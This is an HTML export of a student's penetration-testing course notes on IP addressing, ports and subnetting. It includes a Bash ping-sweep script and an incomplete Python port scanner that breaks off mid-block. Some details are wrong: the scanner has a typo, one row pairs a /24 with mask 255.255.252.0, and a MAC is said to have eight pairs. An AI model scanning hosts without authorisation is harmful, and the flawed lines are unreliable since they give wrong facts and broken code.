<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Practical Network Penetration Tester</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="891e4d90-2dd1-439f-aaf6-3953f8923e57" class="page mono"><header><div class="page-header-icon undefined"><img class="icon" src="https://www.notion.so/icons/code_blue.svg"/></div><h1 class="page-title">Practical Network Penetration Tester</h1><p class="page-description"></p></header><div class="page-body"><h1 id="b766c0fc-f40c-40cc-b142-d5dbed584557" class=""><strong>Pre-Study Session</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#pre-study-session"></a></strong></h1><p id="3fd19a62-daa9-4f86-b3c1-53a14317f79b" class=""><strong>1.network</strong></p><p id="f4514cfc-cf19-44a8-9ebb-b61fb87853b5" class=""><strong>2.linux</strong></p><p id="61fef926-0df5-4b4b-a47a-47773d4339dc" class=""><strong>3.python</strong></p><h2 id="3ee9faa2-50ef-4425-8313-82c0c460d750" class=""><strong>Network</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#network"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7d02ff63-9d52-4c4d-b60d-8ec1e0986470" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">IPv4
  32 bits - Decimal
IPv6
  128 bits - Hexadecimal

MAC (media access control)
  Layer 2
  Relate to switches communication
  Every equipment in the network (or NIC - network interface controller) has one
  Has 8 pares
  The first 3 pares are identifiers
</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ccd92ebe-3610-4f12-94cc-cfd99fb73c3a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">TCP
  SYN &gt; SYN/ACK &gt; ACK

PORTS (Common)
TCP
  FTP (21)
  SSH (22)
  Telnet (23)
  SMTP (25)
  DNS (53)
  HTTP (80)
  HTTPS (443)
  SMB (139 + 445)
  IMAP (143

UDP
  DNS (53)
  DHCP (67,68)
  TFTP (69)
  SNMP (161)
</code></pre><p id="da6ee91a-1b2d-479f-9a25-12b529778895" class="">Subnet:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb9f07fa-6aea-440c-8488-2caa93c3afea" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/24 =&gt; network = 255.255.255.0
Why is /24? because adding the binary check of each octect has the total of 24 bits
example: 255.255.255.0 = 11111111.11111111.11111111.00000000 = /24
</code></pre><table id="61023beb-a3c5-4f57-adcc-e1b6038167a7" class="simple-table"><tbody><tr id="f770acc9-aeb8-4adb-952b-d849444dad2c"><td id="wmsu" class="">1 2 3 4 5 6 7 8</td><td id="oTOC" class="">255.0.0.0</td></tr><tr id="84d4bd04-5c20-4b05-bbbd-d8e66100a928"><td id="wmsu" class="">9 10 11 12 13 14 15 16</td><td id="oTOC" class="">255.255.0.0</td></tr><tr id="8281040f-8aa3-44a4-8069-21e102a87df3"><td id="wmsu" class="">17 18 19 20 21 22 23 24</td><td id="oTOC" class="">255.255.255.0</td></tr><tr id="1b01c388-4bb2-407d-979e-5249828de821"><td id="wmsu" class="">25 26 27 28 29 30 31 32</td><td id="oTOC" class="">255.255.255.255</td></tr></tbody></table><p id="dc64536a-d413-4949-911b-1f137d33c9cc" class="">Hosts:</p><p id="30693389-1a59-42b1-a245-feb6ff0d4d97" class="">128 64 32 16 8 4 2 1</p><hr id="4480f45f-83a2-491a-9dec-878a90464de2"/><p id="056a972e-7dd1-4a34-bcce-1ecfbdc6de3e" class="">Subnet:</p><p id="e432746d-c751-4efa-9cc5-0d6f90ff40ae" class="">128 192 224 240 248 252 254 255</p><hr id="ac6be374-64b6-4963-8a5e-085387b67f1c"/><p id="905561b3-ab0d-47a5-bf65-19c5d83179b2" class="">ps:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d357fce8-6aff-487f-a4c4-1af31f266c8d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Hosts double each increment of a CIDR
Always subtract 2 from host total:
network ID - First address
broadcast  - last address
</code></pre><p id="2b822181-b1ab-4bac-8c2e-a9b3e3784810" class="">Examples:</p><table id="dea46dbf-78a9-4d2f-95cb-974554a43045" class="simple-table"><tbody><tr id="a2fe335d-f67b-4e4b-928d-b8b4fedaec97"><td id="x^Xy" class="">IP</td><td id="`=h}" class="">subnet</td><td id="gJzT" class="">hosts</td><td id="BVZ&lt;" class="">network</td><td id="?}&lt;?" class="">broadcast</td></tr><tr id="dd5129d9-25fd-4f92-b468-ca68aa043f30"><td id="x^Xy" class="">192.168.1.0/24</td><td id="`=h}" class="">255.255.252.0</td><td id="gJzT" class="">254</td><td id="BVZ&lt;" class="">192.168.1.0</td><td id="?}&lt;?" class="">192.168.1.255</td></tr><tr id="169568ab-a4ec-4657-a673-bd1f783a4dc1"><td id="x^Xy" class="">192.168.1.0/28</td><td id="`=h}" class="">255.255.255.240</td><td id="gJzT" class="">14</td><td id="BVZ&lt;" class="">192.168.1.0</td><td id="?}&lt;?" class="">192.168.1.15</td></tr><tr id="5fd7b809-1b81-4432-80d4-a0bd6b8ca0cd"><td id="x^Xy" class="">192.168.1.16/28</td><td id="`=h}" class="">255.255.255.240</td><td id="gJzT" class="">14</td><td id="BVZ&lt;" class="">192.168.1.16</td><td id="?}&lt;?" class="">192.168.1.31</td></tr><tr id="30be8f74-2587-4171-a5b6-a80c97e0aaa7"><td id="x^Xy" class="">192.168.0.0/23</td><td id="`=h}" class="">255.255.254.0</td><td id="gJzT" class="">510</td><td id="BVZ&lt;" class="">192.168.0.0</td><td id="?}&lt;?" class="">192.168.1.255</td></tr><tr id="bcc49c20-4370-45fe-99dd-f71ce5db3e15"><td id="x^Xy" class="">192.168.2.0/23</td><td id="`=h}" class="">255.255.254.0</td><td id="gJzT" class="">510</td><td id="BVZ&lt;" class="">192.168.2.0</td><td id="?}&lt;?" class="">192.168.3.255</td></tr></tbody></table><p id="30835d53-ed10-45c5-8e2f-a19de9d35f59" class="">Test:</p><table id="60d92f93-6fa2-4bfc-b7b8-028e9eca9227" class="simple-table"><tbody><tr id="e719bd5b-e65d-4d2a-bb14-e1c8f0725beb"><td id="gC^_" class="">IP</td><td id="xeE~" class="">subnet</td><td id="LuNB" class="">hosts</td><td id="UzB?" class="">network</td><td id="QgcB" class="">broadcast</td></tr><tr id="178bcc73-ebac-4f2c-8050-834d2f5965a0"><td id="gC^_" class="">192.168.0.0/22</td><td id="xeE~" class="">255.255.252.0</td><td id="LuNB" class="">1022</td><td id="UzB?" class="">192.168.0.0</td><td id="QgcB" class="">192.168.3.255</td></tr><tr id="00f35c27-8525-4418-b97f-c10945a5b814"><td id="gC^_" class="">192.168.1.0/26</td><td id="xeE~" class="">255.255.255.192</td><td id="LuNB" class="">62</td><td id="UzB?" class="">192.168.1.0</td><td id="QgcB" class="">192.168.1.63</td></tr><tr id="fcd4343d-f9c6-45eb-8633-243af8af3eeb"><td id="gC^_" class="">192.168.1.0/27</td><td id="xeE~" class="">255.255.255.224</td><td id="LuNB" class="">30</td><td id="UzB?" class="">192.168.1.0</td><td id="QgcB" class="">192.168.1.31</td></tr></tbody></table><h2 id="7f1fa455-2678-4e8c-afd7-4cef17f65b67" class=""><strong>Linux</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#linux"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="10a8fc25-dc7f-4835-9c9f-62b96a3444f7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping &lt;ip&gt; -c 1 &gt; ip.txt

cat ip.txt | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | tr -d &quot;:&quot;
grep
# -v &quot;something &quot; = grab everything except what you specified after -v
# &quot;somethin&quot; grab what you specified
cut
# -d = delimiter, in this case its a space
# -f = the 4th junk of that data separeted by spaces
tr (translate)
# -d &quot;:&quot; = delimiter - to extract that coma from the line

</code></pre><p id="e0ae9c77-a88f-4120-9662-0f4db71f9cae" class="">ipsweep.sh:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="00472bd0-09a2-471d-925a-8320d7e8aaba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash

if [ &quot;$1&quot; == &quot;&quot; ]
  then
  echo &quot;You forgot an IP address!&quot;
  echo &quot;Syntax: ./ipweep.sh 192.168.0&quot;

else
for ip in `seq 1 254`; do
  ping -c 1 $1.$ip | grep &quot;64 bytes&quot; | cut -d &quot; &quot; -f 4 | tr -d &quot;:&quot; &amp;
  done
fi

</code></pre><h2 id="ee9401ee-7490-4190-a8dd-c26e5fe8b22d" class=""><strong>Python</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#python"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="98968dbd-6eda-48c4-bc7f-187da86871ed" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/bin/python3

import sys
import socket
from datetime import datetime

# Define our Target
if len(sys.argv) == 2:
  target = socket.gethostbyname(sys.argv[1]) # Translate hostaname to IPv4
else:
  print(&quot;Invalid amount of arguments&quot;)
  print(&quot;Syntax: python3 scanner.py &lt;ip&gt;&quot;)

# Add a pretty banner
print (&quot;-&quot; * 50)
print(&quot;Scanning target &quot;+target)
print(&quot;Time started: &quot;+str(datetime.now()))
print (&quot;-&quot; * 50)

try:
  for port in range(50,85):
    s = socket.socket(socket.AF_INET, socker.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    result = s.connect_ex((target,port)) # returns an error indicator
    if result == 0:
      print(f&quot;Port {port} is open&quot;)
    s.close()
except KeyboardInterrupt:
